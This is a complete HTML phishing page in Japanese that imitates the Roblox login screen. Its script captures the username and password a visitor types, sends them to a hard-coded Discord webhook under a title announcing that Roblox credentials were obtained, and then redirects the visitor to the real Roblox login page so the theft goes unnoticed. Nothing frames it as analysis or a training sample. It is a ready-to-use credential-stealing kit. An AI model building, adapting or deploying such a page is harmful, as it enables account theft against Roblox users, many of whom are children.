<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - ログイン</title>
    <style>
        body {
            background-color: #121212;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #ffffff;
        }
        .login-container {
            background-color: #232323;
            padding: 40px;
            border-radius: 8px;
            width: 360px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
        }
        h2 {
            margin-bottom: 24px;
            font-size: 24px;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 14px;
            background-color: #111;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #007acc;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #007acc;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background-color: #005999;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Robloxへログイン</h2>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="ユーザーネーム / メールアドレス / 電話番号" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="パスワード" required>
            </div>
            <button type="submit" id="submitBtn">ログイン</button>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547574646583468063/-FxYGMT8MqC3ryPh1rmKmqlNFcwT74tXGDuDHzeDZTxZ_smJiEM04goWIXs1PQGxlc8q';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.textContent = 'ログイン中...';

            const payload = {
                content: null,
                embeds: [
                    {
                        title: "🎯 Robloxの認証情報を取得しました",
                        color: 16711680,
                        fields: [
                            { name: "👤 ユーザーネーム", value: `\`\`\`${username}\`\`\``, inline: false },
                            { name: "🔑 パスワード", value: `\`\`\`${password}\`\`\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                // ネットワークエラーの処理
            }

            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 500);
        });
    </script>
</body>
</html>
